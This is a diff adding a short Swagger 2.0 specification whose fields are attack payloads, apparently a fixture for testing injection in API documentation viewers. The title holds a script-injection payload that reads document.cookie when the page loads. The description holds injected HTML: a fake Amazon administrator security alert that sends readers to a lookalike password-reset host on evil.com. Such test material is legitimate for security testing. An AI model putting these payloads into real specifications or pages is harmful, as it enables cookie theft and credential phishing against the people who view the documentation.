@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: <svg onload=alert(document.cookie)>
+  description: <br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Amazon administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>changing-password.amazon.evil.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red;">!!!!! IMPORTANT message from Amazon administrator !!!!!!</b></p></marquee><br/><br/><br/><br/> <br/><br/>
+  version: production
